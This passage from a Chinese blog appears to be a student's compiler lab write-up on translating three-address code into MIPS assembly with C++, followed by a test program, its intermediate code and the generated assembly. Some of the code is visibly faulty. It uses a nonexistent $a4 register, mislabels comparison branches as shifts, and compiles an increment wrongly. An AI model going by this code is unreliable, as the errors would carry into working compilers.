$t5,24($sp)\n\tsw $t6,28($sp)\n\tsw $t7,32($sp)\n\tsw $t8,36($sp)\n\tsw $t9,40($sp)\n&quot;</span>+ \</span><br><span class="line">        <span class="string">&quot;\tsw $a0,44($sp)\n\tsw $a1,48($sp)\n\tsw $a3,52($sp)\n\tsw $a4,56($sp)\n&quot;</span>+ \</span><br><span class="line">        <span class="string">&quot;\tjal &quot;</span>+line.<span class="built_in">back</span>()+<span class="string">&quot;\n&quot;</span>+ \</span><br><span class="line">        <span class="string">&quot;\tlw $ra,0($sp)\n\tlw $t0,4($sp)\n\tlw $t1,8($sp)\n\tlw $t2,12($sp)\n\tlw $t3,16($sp)\n&quot;</span>+ \</span><br><span class="line">        <span class="string">&quot;\tlw $t4,20($sp)\n\tlw $t5,24($sp)\n\tlw $t6,28($sp)\n\tlw $t7,32($sp)\n\tlw $t8,36($sp)\n\tlw $t9,40($sp)\n&quot;</span>+ \</span><br><span class="line">        <span class="string">&quot;\tlw $a0,44($sp)\n\tlw $a1,48($sp)\n\tlw $a3,52($sp)\n\tlw $a4,56($sp)\n&quot;</span>+ \</span><br><span class="line">        <span class="string">&quot;\taddi $sp,$sp,60&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>调用前保存寄存器，调用后恢复寄存器（<code>t1-t9 a0-a3</code>）</li>
</ul>
<p>IF 判断语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&quot;IF&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">2</span>] == <span class="string">&quot;==&quot;</span>)&#123;</span><br><span class="line">        temp_return = <span class="string">&quot;\tbeq &quot;</span>;</span><br><span class="line">        temp_return += Get_R(line[<span class="number">1</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        temp_return += Get_R(line[<span class="number">3</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        temp_return += line.back();</span><br><span class="line">        <span class="keyword">return</span> temp_return;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">2</span>] == <span class="string">&quot;!=&quot;</span>)&#123;</span><br><span class="line">        temp_return = <span class="string">&quot;\tbne &quot;</span>;</span><br><span class="line">        temp_return += Get_R(line[<span class="number">1</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        temp_return += Get_R(line[<span class="number">3</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        temp_return += line.back();</span><br><span class="line">        <span class="keyword">return</span> temp_return;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">2</span>] == <span class="string">&quot;&gt;&quot;</span>)&#123;</span><br><span class="line">        temp_return = <span class="string">&quot;\tbgt &quot;</span>;</span><br><span class="line">        temp_return += Get_R(line[<span class="number">1</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        temp_return += Get_R(line[<span class="number">3</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        temp_return += line.back();</span><br><span class="line">        <span class="keyword">return</span> temp_return;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">2</span>] == <span class="string">&quot;&lt;&quot;</span>)&#123;</span><br><span class="line">        temp_return = <span class="string">&quot;\tblt &quot;</span>;</span><br><span class="line">        temp_return += Get_R(line[<span class="number">1</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        temp_return += Get_R(line[<span class="number">3</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        temp_return += line.back();</span><br><span class="line">        <span class="keyword">return</span> temp_return;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">2</span>] == <span class="string">&quot;&gt;=&quot;</span>)&#123;</span><br><span class="line">        temp_return = <span class="string">&quot;\tbge &quot;</span>;</span><br><span class="line">        temp_return += Get_R(line[<span class="number">1</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        temp_return += Get_R(line[<span class="number">3</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        temp_return += line.back();</span><br><span class="line">        <span class="keyword">return</span> temp_return;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">2</span>] == <span class="string">&quot;&lt;=&quot;</span>)&#123;</span><br><span class="line">        temp_return = <span class="string">&quot;\tble &quot;</span>;</span><br><span class="line">        temp_return += Get_R(line[<span class="number">1</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        temp_return += Get_R(line[<span class="number">3</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        temp_return += line.back();</span><br><span class="line">        <span class="keyword">return</span> temp_return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>根据不同的条件，使用对应的汇编代码即可</li>
</ul>
<p>赋值语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&quot;:=&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (line.size() == <span class="number">3</span>)&#123; <span class="comment">/* 对应简单赋值语句 */</span></span><br><span class="line">        <span class="keyword">if</span> (line[<span class="number">2</span>][<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span>)&#123; <span class="comment">// 立即数</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;\tli &quot;</span> + Get_R(line[<span class="number">0</span>]) + <span class="string">&quot;,&quot;</span>+line.back().substr(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            temp_return = <span class="string">&quot;\tmove &quot;</span>; <span class="comment">// 寄存器</span></span><br><span class="line">            temp_return += Get_R(line[<span class="number">0</span>])+<span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">            temp_return += Get_R(line[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">return</span> temp_return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (line.size() == <span class="number">5</span>)&#123; <span class="comment">/* 对应带有运算的赋值语句 */</span></span><br><span class="line">        <span class="keyword">if</span> (line[<span class="number">3</span>] == <span class="string">&quot;+&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (line[<span class="number">2</span>][<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span>)&#123; <span class="comment">// 立即数</span></span><br><span class="line">                temp_return = <span class="string">&quot;\taddi &quot;</span>;</span><br><span class="line">                temp_return += Get_R(line[<span class="number">0</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">                temp_return += Get_R(line[<span class="number">2</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">                temp_return += line.back().substr(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> temp_return;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                temp_return = <span class="string">&quot;\tadd &quot;</span>; <span class="comment">// 寄存器</span></span><br><span class="line">                temp_return += Get_R(line[<span class="number">0</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">                temp_return += Get_R(line[<span class="number">2</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">                temp_return += Get_R(line.back());</span><br><span class="line">                <span class="keyword">return</span> temp_return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (line[<span class="number">3</span>] == <span class="string">&quot;-&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (line[<span class="number">2</span>][<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span>)&#123; <span class="comment">// sub不支持使用立即数</span></span><br><span class="line">                temp_return = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> temp_return;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                temp_return = <span class="string">&quot;\tsub &quot;</span>; <span class="comment">// 寄存器</span></span><br><span class="line">                temp_return += Get_R(line[<span class="number">0</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">                temp_return += Get_R(line[<span class="number">2</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">                temp_return += Get_R(line.back());</span><br><span class="line">                <span class="keyword">return</span> temp_return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (line[<span class="number">3</span>] == <span class="string">&quot;*&quot;</span>)&#123;</span><br><span class="line">            temp_return = <span class="string">&quot;\tmul &quot;</span>;</span><br><span class="line">            temp_return += Get_R(line[<span class="number">0</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">            temp_return += Get_R(line[<span class="number">2</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">            temp_return += Get_R(line.back());</span><br><span class="line">            <span class="keyword">return</span> temp_return;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (line[<span class="number">3</span>] == <span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">            temp_return = <span class="string">&quot;\tdiv &quot;</span>;</span><br><span class="line">            temp_return += Get_R(line[<span class="number">2</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">            temp_return += Get_R(line.back()) + <span class="string">&quot;\n\tmflo &quot;</span>;</span><br><span class="line">            temp_return += Get_R(line[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> temp_return;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (line[<span class="number">3</span>] == <span class="string">&quot;&lt;&quot;</span>)&#123; <span class="comment">/* 左移 */</span></span><br><span class="line">            temp_return = <span class="string">&quot;\tslt &quot;</span>;</span><br><span class="line">            temp_return += Get_R(line[<span class="number">0</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">            temp_return += Get_R(line[<span class="number">2</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">            temp_return += Get_R(line.back());</span><br><span class="line">            <span class="keyword">return</span> temp_return;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (line[<span class="number">3</span>] == <span class="string">&quot;&gt;&quot;</span>)&#123; <span class="comment">/* 右移 */</span></span><br><span class="line">            temp_return = <span class="string">&quot;\tslt &quot;</span>;</span><br><span class="line">            temp_return += Get_R(line[<span class="number">0</span>])+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">            temp_return += Get_R(line.back())+<span class="string">&quot;,&quot;</span>;</span><br><span class="line">            temp_return += Get_R(line[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">return</span> temp_return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">2</span>] == <span class="string">&quot;CALL&quot;</span>) <span class="comment">/* 对应带有函数调用的赋值语句 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        func_argn = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>)+<span class="string">&quot;\taddi $sp,$sp,-60\n\tsw $ra,0($sp)\n\tsw $t0,4($sp)\n\tsw $t1,8($sp)\n\tsw $t2,12($sp)\n\tsw $t3,16($sp)\n&quot;</span>+ \</span><br><span class="line">            <span class="string">&quot;\tsw $t4,20($sp)\n\tsw $t5,24($sp)\n\tsw $t6,28($sp)\n\tsw $t7,32($sp)\n\tsw $t8,36($sp)\n\tsw $t9,40($sp)\n&quot;</span>+ \</span><br><span class="line">            <span class="string">&quot;\tsw $a0,44($sp)\n\tsw $a1,48($sp)\n\tsw $a2,52($sp)\n\tsw $a3,56($sp)\n&quot;</span>+ \</span><br><span class="line">            <span class="string">&quot;\tjal &quot;</span>+line.back()+<span class="string">&quot;\n&quot;</span>+ \</span><br><span class="line">            <span class="string">&quot;\tlw $ra,0($sp)\n\tlw $t0,4($sp)\n\tlw $t1,8($sp)\n\tlw $t2,12($sp)\n\tlw $t3,16($sp)\n&quot;</span>+ \</span><br><span class="line">            <span class="string">&quot;\tlw $t4,20($sp)\n\tlw $t5,24($sp)\n\tlw $t6,28($sp)\n\tlw $t7,32($sp)\n\tlw $t8,36($sp)\n\tlw $t9,40($sp)\n&quot;</span>+ \</span><br><span class="line">            <span class="string">&quot;\tlw $a0,44($sp)\n\tlw $a1,48($sp)\n\tlw $a2,52($sp)\n\tlw $a3,56($sp)\n&quot;</span>+ \</span><br><span class="line">            <span class="string">&quot;\taddi $sp,$sp,60\n\tmove &quot;</span>+Get_R(line[<span class="number">0</span>])+<span class="string">&quot;, $v0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>根据不同的条件，使用对应的汇编代码即可</li>
</ul>
<p>最后需要一个函数组织并输出 <code>demo.s</code> 汇编文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_to_txt</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; obj)</span></span>&#123;</span><br><span class="line">    <span class="function">ofstream <span class="title">out</span><span class="params">(<span class="string">&quot;./demo.s&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">string</span> temp =<span class="string">&quot;.data\n&quot;</span></span><br><span class="line">                <span class="string">&quot;_prompt: .asciiz \&quot;Enter an integer:\&quot;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;_ret: .asciiz \&quot;\\n\&quot;\n&quot;</span></span><br><span class="line">                <span class="string">&quot;.globl main\n&quot;</span></span><br><span class="line">                <span class="string">&quot;.text\n&quot;</span>;</span><br><span class="line">    out&lt;&lt;temp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp; it:obj)</span><br><span class="line">        out&lt;&lt;it&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    out.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>编译与结果</strong></p>
<p>编译命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ main.cpp -o test4</span><br></pre></td></tr></table></figure>
<p>测试文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fast</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a1 = <span class="number">14</span>;</span><br><span class="line">	<span class="keyword">int</span> a2 = <span class="number">15</span>;</span><br><span class="line">	<span class="keyword">int</span> a3 = <span class="number">16</span>;</span><br><span class="line">	<span class="keyword">int</span> a4;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">		a4 = (a1+a2)*a3;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n = <span class="number">5</span>;</span><br><span class="line">	fast(n);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>中间代码：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FUNCTION</span> fast :</span><br><span class="line">  <span class="attribute">PARAM</span> var<span class="number">2</span></span><br><span class="line">  <span class="attribute">temp1</span> := #<span class="number">14</span></span><br><span class="line">  <span class="attribute">var3</span> := temp<span class="number">1</span></span><br><span class="line">  <span class="attribute">temp2</span> := #<span class="number">15</span></span><br><span class="line">  <span class="attribute">var4</span> := temp<span class="number">2</span></span><br><span class="line">  <span class="attribute">temp3</span> := #<span class="number">16</span></span><br><span class="line">  <span class="attribute">var5</span> := temp<span class="number">3</span></span><br><span class="line">  <span class="attribute">temp4</span> := #<span class="number">0</span></span><br><span class="line">  <span class="attribute">var7</span> := temp<span class="number">4</span></span><br><span class="line"><span class="attribute">LABEL</span> label<span class="number">4</span> :</span><br><span class="line">  <span class="attribute">IF</span> var<span class="number">7</span> &lt; var<span class="number">2</span> GOTO label<span class="number">3</span></span><br><span class="line">  <span class="attribute">GOTO</span> label<span class="number">2</span></span><br><span class="line"><span class="attribute">LABEL</span> label<span class="number">3</span> :</span><br><span class="line">  <span class="attribute">temp5</span> := var<span class="number">3</span> + var<span class="number">4</span></span><br><span class="line">  <span class="attribute">temp6</span> := temp<span class="number">5</span> * var<span class="number">5</span></span><br><span class="line">  <span class="attribute">var6</span> := temp<span class="number">6</span></span><br><span class="line">  <span class="attribute">var7</span> := var<span class="number">7</span> + <span class="number">1</span></span><br><span class="line">  <span class="attribute">GOTO</span> label<span class="number">4</span></span><br><span class="line"><span class="attribute">LABEL</span> label<span class="number">2</span> :</span><br><span class="line">  <span class="attribute">temp7</span> := #<span class="number">0</span></span><br><span class="line">  <span class="attribute">RETURN</span> temp<span class="number">7</span></span><br><span class="line"><span class="attribute">LABEL</span> label<span class="number">1</span> :</span><br><span class="line"></span><br><span class="line"><span class="attribute">FUNCTION</span> main :</span><br><span class="line">  <span class="attribute">temp8</span> := #<span class="number">5</span></span><br><span class="line">  <span class="attribute">var9</span> := temp<span class="number">8</span></span><br><span class="line">  <span class="attribute">ARG</span> var<span class="number">9</span></span><br><span class="line">  <span class="attribute">temp9</span> := CALL fast</span><br><span class="line">  <span class="attribute">temp10</span> := #<span class="number">0</span></span><br><span class="line">  <span class="attribute">RETURN</span> temp<span class="number">10</span></span><br><span class="line"><span class="attribute">LABEL</span> label<span class="number">5</span> :</span><br></pre></td></tr></table></figure>
<p>汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">_prompt: .asciiz &quot;Enter an integer:&quot;</span><br><span class="line">_ret: .asciiz &quot;\n&quot;</span><br><span class="line">.globl main</span><br><span class="line">.text</span><br><span class="line">fast:</span><br><span class="line">	li $t1,14</span><br><span class="line">	move $t2,$t1</span><br><span class="line">	li $t1,15</span><br><span class="line">	move $t3,$t1</span><br><span class="line">	li $t1,16</span><br><span class="line">	move $t4,$t1</span><br><span class="line">	li $t1,0</span><br><span class="line">	move $t5,$t1</span><br><span class="line">label4:</span><br><span class="line">	blt $t5,$a0,label3</span><br><span class="line">	j label2</span><br><span class="line">label3:</span><br><span class="line">	add $t1,$t2,$t3</span><br><span class="line">	mul $t6,$t1,$t4</span><br><span class="line">	move $t1,$t6</span><br><span class="line">	add $t5,$t5,$t6</span><br><span class="line">	j label4</span><br><span class="line">label2:</span><br><span class="line">	li $t7,0</span><br><span class="line">	move $v0,$t7</span><br><span class="line">	jr $ra</span><br><span class="line">label1:</span><br><span class="line">main:</span><br><span class="line">	li $t1,5</span><br><span class="line">	move $t2,$t1</span><br><span class="line">	move $a0,$t2</span><br><span class="line">	addi $sp,$sp,-60</span><br><span class="line">	sw $ra,0($sp)</span><br><span class="line">	sw $t0,4($sp)</span><br><span class="line">	sw $t1,8($sp)</span><br><span class="line">	sw $t2,12($sp)</span><br><span class="line">	sw $t3,16($sp)</span><br><span class="line">	sw $t4,20($sp)</span><br><span class="line">	sw $t5,24($sp)</span><br><span class="line">	sw $t6,28($sp)</span><br><span class="line">	sw $t7,32($sp)</span><br><span class="line">	sw $t8,36($sp)</span><br><span class="line">	sw $t9,40($sp)</span><br><span class="line">	sw $a0,44($sp)</span><br><span class="line">	sw $a1,48($sp)</span><br><span class="line">	sw $a2,52($sp)</span><br><span class="line">	sw $a3,56($sp)</span><br><span class="line">	jal fast</span><br><span class="line">	lw $ra,0($sp)</span><br><span class="line">	lw $t0,4($sp)</span><br><span class="line">	lw $t1,8($sp)</span><br><span class="line">	lw $t2,12($sp)</span><br><span class="line">	lw $t3,16($sp)</span><br><span class="line">	lw $t4,20($sp)</span><br><span class="line">	lw $t5,24($sp)</span><br><span class="line">	lw $t6,28($sp)</span><br><span class="line">	lw $t7,32($sp)</span><br><span class="line">	lw $t8,36($sp)</span><br><span class="line">	lw $t9,40($sp)</span><br><span class="line">	lw $a0,44($sp)</span><br><span class="line">	lw $a1,48($sp)</span><br><span class="line">	lw $a2,52($sp)</span><br><span class="line">	lw $a3,56($sp)</span><br><span class="line">	addi $sp,$sp,60</span><br><span class="line">	move $t1, $v0</span><br><span class="line">	li $t1,0</span><br><span class="line">	move $v0,$t1</span><br><span class="line">	jr $ra</span><br><span class="line">label5:</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/21/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/21/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab3/" class="post-title-link" itemprop="url">编译原理-Lab3</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-21 23:40:54" itemprop="dateCreated datePublished" datetime="2023-03-21T23:40:54+08:00">2023-03-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-22 00:53:42" itemprop="dateModified" datetime="2023-03-22T00:53:42+08:00">2023-03-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>28k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>25 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="第一个任务"><a href="#第一个任务" class="headerlink" title="第一个任务"></a>第一个任务</h2><p>通过前面对 AST 遍历，完成了语义分析后，如果没有语法语义错误，就可以再次对 AST 进行遍历，计算相关的属性值，建立符号表，并生成以三地址代码 TAC 作为中间语言的中间语言代码序列</p>
<p>在这里对本实验的实现做了一些限制，假设数据类型只包含整数类型，不包含如浮点数、数组、结构和指针等其它数据类型</p>
<p>实验目标：完成语义分析的下半部分，以根据 AST 生成中间语言 TAC</p>
<p><strong>三地址代码 TAC</strong></p>
